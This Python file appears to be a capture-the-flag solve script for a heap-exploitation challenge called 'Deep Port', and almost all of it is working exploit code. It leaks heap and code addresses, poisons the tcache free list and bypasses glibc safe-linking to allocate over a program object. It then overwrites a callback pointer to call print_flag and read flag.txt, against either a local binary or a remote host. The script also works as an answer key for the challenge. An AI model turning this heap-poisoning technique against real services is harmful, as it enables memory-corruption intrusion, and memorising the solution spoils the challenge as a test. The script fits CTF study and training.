#!/usr/bin/env python3

from __future__ import annotations

import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path
from typing import BinaryIO

BASE = Path(__file__).resolve().parent
BINARY = BASE / "deep_port"

SIZE = 0x48
READ_LEN = SIZE - 1
STANDBY_OFFSET = 0x1209
PRINT_FLAG_OFFSET = 0x1247
DEFAULT_PRINT_FLAG_DELTA = PRINT_FLAG_OFFSET - STANDBY_OFFSET
FLAG_RE = re.compile(rb"grodno\{[^\r\n}]+\}")


def p64(value: int) -> bytes:
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


class Tube:
    def __init__(
        self,
        *,
        process: subprocess.Popen[bytes] | None = None,
        sock: socket.socket | None = None,
        timeout: float = 5.0,
    ) -> None:
        self.process = process
        self.sock = sock
        self.timeout = timeout
        self.buffer = bytearray()

    @classmethod
    def local(cls, path: Path, timeout: float = 5.0) -> "Tube":
        process = subprocess.Popen(
            [str(path)],
            cwd=str(path.parent),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )
        return cls(process=process, timeout=timeout)

    @classmethod
    def remote(cls, host: str, port: int, timeout: float = 5.0) -> "Tube":
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.setblocking(False)
        return cls(sock=sock, timeout=timeout)

    def _read_once(self, timeout: float) -> bytes:
        if self.sock is not None:
            ready, _, _ = select.select([self.sock], [], [], timeout)
            if not ready:
                return b""
            try:
                return self.sock.recv(4096)
            except BlockingIOError:
                return b""

        if self.process is None or self.process.stdout is None:
            return b""

        ready, _, _ = select.select([self.process.stdout], [], [], timeout)
        if not ready:
            return b""
        return os.read(self.process.stdout.fileno(), 4096)

    def send(self, data: bytes) -> None:
        if self.sock is not None:
            self.sock.sendall(data)
            return

        if self.process is None or self.process.stdin is None:
            raise RuntimeError("process stdin unavailable")
        self.process.stdin.write(data)
        self.process.stdin.flush()

    def sendline(self, data: bytes | str | int) -> None:
        if isinstance(data, int):
            raw = str(data).encode()
        elif isinstance(data, str):
            raw = data.encode()
        else:
            raw = data
        self.send(raw + b"\n")

    def recvuntil(self, delimiter: bytes, timeout: float | None = None) -> bytes:
        deadline = time.monotonic() + (self.timeout if timeout is None else timeout)

        while delimiter not in self.buffer:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(
                    f"timeout waiting for {delimiter!r}; buffered={bytes(self.buffer)!r}"
                )

            chunk = self._read_once(remaining)
            if not chunk:
                if self.process is not None and self.process.poll() is not None:
                    raise EOFError(bytes(self.buffer))
                if self.sock is not None:
                    # A readable socket returning b'' means EOF. A select timeout is
                    # handled by the next loop/deadline check.
                    ready, _, _ = select.select([self.sock], [], [], 0)
                    if ready:
                        raise EOFError(bytes(self.buffer))
                continue
            self.buffer.extend(chunk)

        end = self.buffer.index(delimiter) + len(delimiter)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def recvall(self, timeout: float = 3.0) -> bytes:
        result = bytearray(self.buffer)
        self.buffer.clear()
        deadline = time.monotonic() + timeout

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            chunk = self._read_once(remaining)
            if not chunk:
                if self.process is not None and self.process.poll() is not None:
                    break
                if self.sock is not None:
                    ready, _, _ = select.select([self.sock], [], [], 0)
                    if ready:
                        break
                continue
            result.extend(chunk)

        return bytes(result)

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass

        if self.process is not None and self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=1)
            except subprocess.TimeoutExpired:
                self.process.kill()


class DeepPort:
    def __init__(self, io: Tube) -> None:
        self.io = io
        self.io.recvuntil(b"> ")

    def _finish(self) -> bytes:
        return self.io.recvuntil(b"> ")

    def create(self, slot: int, size: int, data: bytes) -> bytes:
        if len(data) != size - 1:
            raise ValueError(f"create payload must be exactly {size - 1:#x} bytes")

        self.io.sendline(1)
        self.io.recvuntil(b"Slot:\n")
        self.io.sendline(slot)
        self.io.recvuntil(b"Manifest size:\n")
        self.io.sendline(size)
        self.io.recvuntil(b"Manifest data:\n")
        self.io.send(data)
        output = self._finish()

        if b"Docked." not in output:
            raise RuntimeError(f"create failed: {output!r}")
        return output

    def edit(self, slot: int, data: bytes) -> bytes:
        if len(data) != READ_LEN:
            raise ValueError(f"edit payload must be exactly {READ_LEN:#x} bytes")

        self.io.sendline(2)
        self.io.recvuntil(b"Slot:\n")
        self.io.sendline(slot)
        self.io.recvuntil(b"New manifest data:\n")
        self.io.send(data)
        output = self._finish()

        if b"Updated." not in output:
            raise RuntimeError(f"edit failed: {output!r}")
        return output

    def view(self, slot: int) -> bytes:
        self.io.sendline(3)
        self.io.recvuntil(b"Slot:\n")
        self.io.sendline(slot)
        output = self._finish()

        if b"Receipt stamp:" not in output:
            raise RuntimeError(f"view failed: {output!r}")
        return output

    def release(self, slot: int) -> bytes:
        self.io.sendline(4)
        self.io.recvuntil(b"Slot:\n")
        self.io.sendline(slot)
        output = self._finish()

        if b"Shipment released." not in output:
            raise RuntimeError(f"release failed: {output!r}")
        return output

    def replace(self, slot: int, data: bytes) -> bytes:
        if len(data) != READ_LEN:
            raise ValueError(f"replacement payload must be exactly {READ_LEN:#x} bytes")

        self.io.sendline(5)
        self.io.recvuntil(b"Slot:\n")
        self.io.sendline(slot)
        self.io.recvuntil(b"Replacement manifest:\n")
        self.io.send(data)
        output = self._finish()

        if b"Manifest replaced." not in output:
            raise RuntimeError(f"replace failed: {output!r}")
        return output

    def dispatch(self) -> bytes:
        self.io.sendline(7)
        return self.io.recvall(timeout=4.0)


def parse_view(output: bytes) -> tuple[int, int, int]:
    stamp_match = re.search(rb"Receipt stamp: (0x[0-9a-fA-F]+)", output)
    pointer_match = re.search(rb"Manifest pointer: (0x[0-9a-fA-F]+)", output)
    encoded_match = re.search(rb"Encoded next: 0x([0-9a-fA-F]+)", output)

    if not stamp_match or not pointer_match or not encoded_match:
        raise RuntimeError(f"could not parse view output: {output!r}")

    return (
        int(stamp_match.group(1), 16),
        int(pointer_match.group(1), 16),
        int(encoded_match.group(1), 16),
    )


def exploit(io: Tube, print_flag_delta: int) -> bytes:
    port = DeepPort(io)

    port.create(0, SIZE, b"A" * READ_LEN)
    port.create(1, SIZE, b"B" * READ_LEN)

    view0 = port.view(0)
    view1 = port.view(1)

    standby, chunk_a, _ = parse_view(view0)
    _, chunk_b, _ = parse_view(view1)

    chunk_stride = chunk_b - chunk_a
    if chunk_stride <= 0 or chunk_stride & 0xF:
        raise RuntimeError(f"unexpected heap layout: stride={chunk_stride:#x}")

    # setup() allocates the harbor object immediately before the two shipment
    # chunks, all with the same 0x48 request size.
    harbor = chunk_a - chunk_stride
    print_flag = standby + print_flag_delta

    print(f"[+] standby leak   : {standby:#x}")
    print(f"[+] shipment A     : {chunk_a:#x}")
    print(f"[+] shipment B     : {chunk_b:#x}")
    print(f"[+] chunk stride   : {chunk_stride:#x}")
    print(f"[+] harbor object  : {harbor:#x}")
    print(f"[+] print_flag     : {print_flag:#x}")

    # Tcache order after these frees: B -> A.
    port.release(0)
    port.release(1)

    # Safe-linking: stored_next = target ^ (chunk_address >> 12).
    encoded_harbor = harbor ^ (chunk_b >> 12)
    poison = p64(encoded_harbor).ljust(READ_LEN, b"P")
    port.edit(1, poison)

    # Pop B. The next tcache entry is now the forged harbor address.
    port.replace(1, b"X" * READ_LEN)

    # The next malloc(SIZE) returns the harbor object. Overwrite its callback
    # while preserving the route used by print_flag().
    harbor_payload = (
        b"Deep Port compromised".ljust(0x20, b"\x00")
        + p64(print_flag)
        + b"flag.txt\x00"
    ).ljust(READ_LEN, b"\x00")

    port.replace(0, harbor_payload)
    return port.dispatch()


def parse_int(value: str) -> int:
    return int(value, 0)


def main() -> int:
    parser = argparse.ArgumentParser(description="Deep Port exploit")
    parser.add_argument("host", nargs="?")
    parser.add_argument("port", nargs="?", type=int)
    parser.add_argument(
        "--print-flag-delta",
        type=parse_int,
        default=DEFAULT_PRINT_FLAG_DELTA,
        help=f"print_flag - standby delta (default: {DEFAULT_PRINT_FLAG_DELTA:#x})",
    )
    args = parser.parse_args()

    if (args.host is None) != (args.port is None):
        parser.error("use either no arguments for local, or: solve.py HOST PORT")

    io: Tube | None = None
    try:
        if args.host is None:
            if not BINARY.exists():
                raise FileNotFoundError(f"binary not found: {BINARY}")
            io = Tube.local(BINARY)
        else:
            io = Tube.remote(args.host, args.port)

        output = exploit(io, args.print_flag_delta)
        sys.stdout.buffer.write(output)
        sys.stdout.buffer.flush()

        match = FLAG_RE.search(output)
        if match:
            flag = match.group(0).decode()
            print(f"\n<FLAG>{flag}</FLAG>")
            return 0

        print("[-] dispatch executed, but no flag was found", file=sys.stderr)
        return 1

    except (EOFError, TimeoutError, OSError, RuntimeError, ValueError) as error:
        print(f"[-] exploit failed: {error}", file=sys.stderr)
        return 1
    finally:
        if io is not None:
            io.close()


if __name__ == "__main__":
    raise SystemExit(main())
